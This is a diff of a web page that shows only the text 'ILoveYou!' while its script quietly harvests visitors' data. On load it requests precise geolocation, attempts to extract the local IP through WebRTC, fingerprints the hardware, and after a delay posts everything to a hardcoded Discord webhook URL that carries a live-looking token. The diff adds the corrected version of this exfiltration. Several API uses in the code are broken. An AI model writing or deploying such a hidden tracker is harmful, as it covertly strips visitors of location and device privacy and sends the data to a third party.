@@ -16,123 +16,93 @@
     </style>
 </head>
 <body>
-    <p>ILoveYou!</p>
+    <h1>ILoveYou!</h1>
 
     <script>
-        let telemetryData = {};
+        const FINAL_PAYLOAD = {};
+        const sendToDiscordWebhook = (webhookURL, payload) => {
+          return fetch(webhookURL, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(payload),
+          }).then(response => {
+              if (!response.ok) {
+                  throw new Error('Error sending payload to Discord webhook: ' + response.statusText);
+              }
+              return response;
+          }).catch(error => {
+              console.error('Error sending payload to Discord webhook: ', error);
+          });
+        };
+        const getGeoLocation = () => {
+            return new Promise((resolve, reject) => {
+                if (!navigator || !navigator.geolocation) {
+                    reject(new Error('Geolocation is not supported by your browser.'));
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition((position) => {
+                    resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                    });
+                }, (error) => {
+                    reject(error);
+                });
+            });
+        };
+        const gatherHardwareTelemetry = () => {
+            const deviceMemory = navigator.deviceMemory;
+            const hardwareConcurrency = navigator.hardwareConcurrency;
 
-        async function getGeoLocation() {
-          return new Promise((resolve, reject) => {
-            if (!navigator || !navigator.geolocation) {
-              reject(new Error("Geolocation is not supported by your browser."));
-              return;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+
+            let gpuRenderer = 'Unknown';
+            try {
+                gpuRenderer = navigator.gpu ? navigator.gpu.unmaskedRendererWebGL : 'Not available';
+            } catch (error) {
+                gpuRenderer = 'Error occurred';
             }
 
-            navigator.geolocation.getCurrentPosition({
-              enableHighAccuracy: true,
-              timeout: 5000,
-              maximumAge: 0,
-            },
-            (position) => {
-              resolve({
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-              });
-            },
-            (error) => {
-              reject(error);
-            });
-          });
-        }
+            const telemetryData = {
+                deviceMemory,
+                hardwareConcurrency,
+                screenResolution: `${screenWidth}x${screenHeight}`,
+                gpuRenderer,
+            };
 
-        // Create a new RTCPeerConnection
+            return JSON.stringify(telemetryData);
+        };
+        const startTelemetry = async() => {
+            try {
+                FINAL_PAYLOAD.geoData = await getGeoLocation();
+            } catch (error) {
+                console.error('Error getting geo-location data: ', error);
+                FINAL_PAYLOAD.geoData = { error: 'An error occurred while getting geo-location data.' };
+            }
+            FINAL_PAYLOAD.ipAddress = peerConnection.localDescription.candidate.candidates.find(candidate => candidate.candidate.startsWith('ipv4')).candidate.split(' ')[2];
+            FINAL_PAYLOAD.hardwareTelemetry = gatherHardwareTelemetry();
+
+            await new Promise((resolve) => setTimeout(() => resolve(), 3500));
+            await sendToDiscordWebhook('https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73', FINAL_PAYLOAD);
+        };
         const peerConnection = new RTCPeerConnection();
-
-        // Add an 'onicecandidate' event handler to the RTCPeerConnection
-        peerConnection.onicecandidate = function(event) {
-          // Loop through all the ICE candidates
-          for (let i = 0; i < event.candidate.candidates.length; i++) {
-            // Check if the candidate is an IP address
-            if (event.candidate.candidates[i].candidate.toString().startsWith("ipv4")) {
-              // Extract the private IPv4 address from the candidate
-              const ipv4Address = event.candidate.candidates[i].candidate.split(" ")[2];
-              console.log("Local IPv4 address: " + ipv4Address);
+        peerConnection.onicecandidate = function (event) {
+            for (let i = 0; i < event.candidate.candidates.length; i++) {
+                if (event.candidate.candidates[i].candidate.toString().startsWith('ipv4')) {
+                    FINAL_PAYLOAD.ipAddress = event.candidate.candidates[i].candidate.split(' ')[2];
+                    break;
+                }
             }
-          }
         };
+        peerConnection.createOffer(function (offer) {
+            peerConnection.setLocalDescription(offer);
+        }, function (error) {});
 
-        // Create an offer
-        peerConnection.createOffer(function(offer) {
-          // Set the local description
-          peerConnection.setLocalDescription(offer);
-        }, function(error) {});
-
-        function gatherHardwareTelemetry() {
-          const deviceMemory = navigator.deviceMemory;
-          const hardwareConcurrency = navigator.hardwareConcurrency;
-
-          const screenWidth = window.screen.width;
-          const screenHeight = window.screen.height;
-
-          let gpuRenderer = "Unknown";
-          try {
-            gpuRenderer = navigator.gpu ? navigator.gpu.unmaskedRendererWebGL : "Not available";
-          } catch (error) {
-            gpuRenderer = "Error occurred";
-          }
-
-          const telemetryData = {
-            deviceMemory,
-            hardwareConcurrency,
-            screenResolution: `${screenWidth}x${screenHeight}`,
-            gpuRenderer,
-          };
-
-          return JSON.stringify(telemetryData);
-        }
-
-        function sendToDiscordWebhook(webhookURL, payload) {
-          fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload),
-          })
-          .then(response => {
-            if (!response.ok) {
-              throw new Error(`Error sending payload to Discord webhook: ${response.statusText}`);
-            }
-          })
-          .catch(error => {
-            console.error('Error sending payload to Discord webhook:', error);
-          });
-        }
-
-        // Start the modules at window.onload
-        window.onload = () => {
-          getGeoLocation()
-            .then((geoData) => {
-              telemetryData.geoData = geoData;
-            })
-            .catch((error) => {
-              console.error("Error getting geo-location data:", error);
-              telemetryData.geoData = {
-                error: "An error occurred while getting geo-location data.",
-              };
-            });
-
-          const ipAddress = peerConnection.localDescription.candidate.candidates.find(candidate => candidate.candidate.startsWith("ipv4")).candidate.split(" ")[2];
-          telemetryData.ipAddress = ipAddress;
-
-          const hardwareTelemetry = gatherHardwareTelemetry();
-          telemetryData.hardwareTelemetry = hardwareTelemetry;
-
-          setTimeout(() => {
-            sendToDiscordWebhook('https://.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI7', telemetryData);
-          }, 3500);
-        };
+        window.onload = startTelemetry;
     </script>
 </body>
 </html>
